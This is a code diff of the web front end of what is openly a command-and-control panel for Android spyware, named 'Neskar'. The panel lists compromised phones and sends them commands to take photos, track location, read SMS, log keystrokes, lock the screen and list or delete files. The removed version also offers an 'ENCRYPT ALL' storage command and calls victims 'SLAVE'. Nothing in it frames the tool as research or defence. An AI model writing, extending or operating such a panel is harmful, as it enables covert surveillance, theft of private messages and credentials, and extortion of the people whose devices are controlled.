@@ -2,71 +2,171 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>NESKAR V11 COMMAND CENTER</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Neskar C2 Panel</title>
     <style>
-        body { background: #050505; color: #00ff41; font-family: 'Consolas', monospace; margin: 0; display: flex; }
-        #side { width: 320px; border-right: 2px solid #ff0000; height: 100vh; background: #0a0a0a; padding: 15px; }
-        #main { flex: 1; padding: 25px; overflow-y: auto; }
-        .t-card { border: 1px solid #333; padding: 10px; margin: 10px 0; cursor: pointer; border-radius: 4px; }
-        .t-card.active { border-color: #ff0000; background: #1a0000; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; }
-        button { background: #111; color: #ff0000; border: 1px solid #ff0000; padding: 8px; cursor: pointer; font-weight: bold; font-size: 11px; }
-        button:hover { background: #ff0000; color: #000; }
-        #log { background: #000; border: 1px solid #222; height: 350px; overflow-y: auto; padding: 10px; margin-top: 20px; color: #aaa; font-size: 12px; }
-        .header { color: #ff0000; text-shadow: 0 0 5px #ff0000; text-align: center; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0f1e; color: #e0e0e0; display: flex; height: 100vh; }
+        .sidebar { width: 300px; background: #141b2b; padding: 20px; overflow-y: auto; border-right: 1px solid #2a3440; }
+        .main { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; }
+        .device-list { list-style: none; }
+        .device-item { padding: 15px; margin-bottom: 10px; background: #1e293b; border-radius: 8px; cursor: pointer; transition: 0.2s; border-left: 4px solid #3b82f6; }
+        .device-item:hover { background: #2d3a4f; }
+        .device-item.selected { background: #2d3a4f; border-left-color: #f97316; }
+        .device-name { font-weight: bold; font-size: 1.1em; }
+        .device-last { font-size: 0.8em; color: #94a3b8; margin-top: 5px; }
+        .badge { background: #3b82f6; color: white; padding: 2px 8px; border-radius: 12px; font-size: 0.7em; float: right; }
+        .control-panel { background: #141b2b; border-radius: 12px; padding: 20px; margin-bottom: 20px; }
+        .command-buttons { display: flex; flex-wrap: wrap; gap: 10px; margin: 15px 0; }
+        .cmd-btn { background: #2d3a4f; border: none; color: white; padding: 8px 15px; border-radius: 20px; cursor: pointer; font-size: 0.9em; transition: 0.2s; }
+        .cmd-btn:hover { background: #3b82f6; }
+        .custom-cmd { display: flex; gap: 10px; margin-top: 15px; }
+        .custom-cmd input { flex: 1; padding: 10px; background: #1e293b; border: 1px solid #2a3440; border-radius: 6px; color: white; }
+        .custom-cmd button { padding: 10px 20px; background: #3b82f6; border: none; border-radius: 6px; color: white; cursor: pointer; }
+        .results { background: #141b2b; border-radius: 12px; padding: 20px; flex: 1; overflow-y: auto; }
+        .result-item { background: #1e293b; padding: 10px; margin-bottom: 8px; border-radius: 6px; border-left: 3px solid #f97316; }
+        .result-time { font-size: 0.7em; color: #94a3b8; }
+        .result-command { font-weight: bold; color: #f97316; }
+        .result-content { margin-top: 5px; white-space: pre-wrap; word-break: break-word; }
+        .notification { position: fixed; top: 20px; right: 20px; background: #f97316; color: black; padding: 15px 20px; border-radius: 8px; display: none; z-index: 1000; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
     </style>
 </head>
 <body>
-    <div id="side">
-        <h2 class="header">NESKAR V11</h2>
-        <div id="targetList"></div>
+    <div class="sidebar">
+        <h2>📱 Devices</h2>
+        <div style="margin: 15px 0; color: #94a3b8;">Total: <span id="deviceCount">0</span></div>
+        <ul class="device-list" id="deviceList"></ul>
     </div>
-    <div id="main">
-        <h3 id="targetInfo">SELECT A SLAVE...</h3>
-        <div class="grid">
-            <button onclick="sc('/flash_on')">FLASH ON</button>
-            <button onclick="sc('/flash_off')">FLASH OFF</button>
-            <button onclick="sc('/lock_screen')">LOCK SCREEN</button>
-            <button onclick="sc('/unlock_screen')">UNLOCK SCREEN</button>
-            <button onclick="sc('/take_pic')">TAKE PHOTO</button>
-            <button onclick="sc('/location')">GET LOC</button>
-            <button onclick="sc('/start_location')">LIVE LOC ON</button>
-            <button onclick="sc('/stop_location')">LIVE LOC OFF</button>
-            <button onclick="sc('/sysinfo')">SYS INFO</button>
-            <button onclick="sc('/check_sms')">READ SMS ALL</button>
-            <button onclick="sc('/get_sms_new')">GET NEW SMS</button>
-            <button onclick="sc('/get_sms_old')">GET OLD SMS</button>
-            <button onclick="sc('/keylog_on')">KEYLOG ON</button>
-            <button onclick="sc('/keylog_off')">KEYLOG OFF + DUMP</button>
-            <button onclick="sc('/list_files')">FILE MANAGER</button>
-            <button onclick="sc('/lock_storage')">ENCRYPT ALL</button>
-            <button onclick="sc('/unlock_storage')">DECRYPT ALL</button>
-            <button onclick="sc('/open_app')">OPEN APP</button>
-            <button onclick="sc('/close_app')">KILL APP</button>
+    <div class="main">
+        <div class="control-panel" id="controlPanel" style="display: none;">
+            <h3>Mengontrol: <span id="selectedDeviceId"></span></h3>
+            <div class="command-buttons">
+                <button class="cmd-btn" data-cmd="/sysinfo">📊 Sysinfo</button>
+                <button class="cmd-btn" data-cmd="/location">📍 Location</button>
+                <button class="cmd-btn" data-cmd="/take_pic">📸 Take Pic</button>
+                <button class="cmd-btn" data-cmd="/check_sms">📨 SMS</button>
+                <button class="cmd-btn" data-cmd="/keylog_on">🔑 Keylog On</button>
+                <button class="cmd-btn" data-cmd="/keylog_off">🔒 Keylog Off</button>
+                <button class="cmd-btn" data-cmd="/lock_screen">🔒 Lock Screen</button>
+                <button class="cmd-btn" data-cmd="/unlock_screen">🔓 Unlock Screen</button>
+                <button class="cmd-btn" data-cmd="/flash_on">💡 Flash On</button>
+                <button class="cmd-btn" data-cmd="/flash_off">💡 Flash Off</button>
+                <button class="cmd-btn" data-cmd="/list_files">📁 List Files</button>
+            </div>
+            <div class="custom-cmd">
+                <input type="text" id="customCommand" placeholder="Custom command, misal /delete_file /sdcard/test.txt">
+                <button id="sendCustom">Kirim</button>
+            </div>
         </div>
-        <div id="log"></div>
+        <div class="results">
+            <h3>📋 Hasil</h3>
+            <div id="resultsList"></div>
+        </div>
     </div>
-    <script src="/socket.io/socket.io.js"></script>
+
+    <div class="notification" id="notification">New device registered!</div>
+
     <script>
-        const socket = io();
-        let cur = null;
-        socket.on('update_list', (targets) => {
-            const list = document.getElementById('targetList');
-            list.innerHTML = '';
-            targets.forEach(t => {
-                const d = document.createElement('div');
-                d.className = `t-card ${cur === t.id ? 'active' : ''}`;
-                d.innerHTML = `[${t.id.substring(0,8)}] ${t.info.model}`;
-                d.onclick = () => { cur = t.id; document.getElementById('targetInfo').innerText = "TARGET: " + t.id; };
-                list.appendChild(d);
+        let devices = {};
+        let selectedDevice = null;
+        let lastDeviceCount = 0;
+
+        async function fetchDevices() {
+            const res = await fetch('/api/devices');
+            devices = await res.json();
+            const deviceList = document.getElementById('deviceList');
+            const count = Object.keys(devices).length;
+            document.getElementById('deviceCount').innerText = count;
+            if (count > lastDeviceCount) {
+                showNotification('📱 New device connected!');
+            }
+            lastDeviceCount = count;
+            deviceList.innerHTML = '';
+            for (let id in devices) {
+                const dev = devices[id];
+                const li = document.createElement('li');
+                li.className = `device-item ${selectedDevice === id ? 'selected' : ''}`;
+                li.setAttribute('data-id', id);
+                li.innerHTML = `
+                    <div class="device-name">${id.substring(0, 8)}... <span class="badge">online</span></div>
+                    <div class="device-last">Last: ${new Date(dev.lastSeen).toLocaleString()}</div>
+                `;
+                li.addEventListener('click', () => selectDevice(id));
+                deviceList.appendChild(li);
+            }
+        }
+
+        function selectDevice(id) {
+            selectedDevice = id;
+            document.getElementById('selectedDeviceId').innerText = id;
+            document.getElementById('controlPanel').style.display = 'block';
+            // refresh selected class
+            document.querySelectorAll('.device-item').forEach(el => {
+                if (el.getAttribute('data-id') === id) el.classList.add('selected');
+                else el.classList.remove('selected');
+            });
+            loadResults(id);
+        }
+
+        async function sendCommand(deviceId, cmd) {
+            if (!deviceId) return alert('Pilih device dulu!');
+            await fetch('/api/send_command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ deviceId, command: cmd })
+            });
+            alert('Command dikirim!');
+        }
+
+        async function loadResults(deviceId) {
+            const res = await fetch(`/api/results/${deviceId}`);
+            const results = await res.json();
+            const resultsDiv = document.getElementById('resultsList');
+            resultsDiv.innerHTML = '';
+            results.reverse().forEach(r => {
+                const div = document.createElement('div');
+                div.className = 'result-item';
+                let content = r.result || '';
+                if (r.type === 'photo') {
+                    content = `<img src="/uploads/${r.filename}" style="max-width:200px; border-radius:4px;">`;
+                }
+                div.innerHTML = `
+                    <div class="result-time">${new Date(r.timestamp).toLocaleString()}</div>
+                    <div class="result-command">${r.command || r.type}</div>
+                    <div class="result-content">${content}</div>
+                `;
+                resultsDiv.appendChild(div);
+            });
+        }
+
+        function showNotification(msg) {
+            const notif = document.getElementById('notification');
+            notif.style.display = 'block';
+            notif.innerText = msg;
+            setTimeout(() => { notif.style.display = 'none'; }, 3000);
+        }
+
+        // Event listeners untuk tombol
+        document.querySelectorAll('.cmd-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const cmd = btn.getAttribute('data-cmd');
+                sendCommand(selectedDevice, cmd);
             });
         });
-        socket.on('log_result', (d) => {
-            const l = document.getElementById('log');
-            l.innerHTML += `<div>[${new Date().toLocaleTimeString()}] > ${d.res}</div>`;
-            l.scrollTop = l.scrollHeight;
+
+        document.getElementById('sendCustom').addEventListener('click', () => {
+            const cmd = document.getElementById('customCommand').value;
+            if (cmd) sendCommand(selectedDevice, cmd);
         });
-        function sc(cmd) { if(!cur) return; socket.emit('send_cmd', { targetId: cur, cmd: cmd }); }
+
+        // Polling devices setiap 3 detik
+        setInterval(fetchDevices, 3000);
+        // Polling results jika ada device terpilih
+        setInterval(() => {
+            if (selectedDevice) loadResults(selectedDevice);
+        }, 5000);
+
+        fetchDevices();
     </script>
 </body>
 </html>
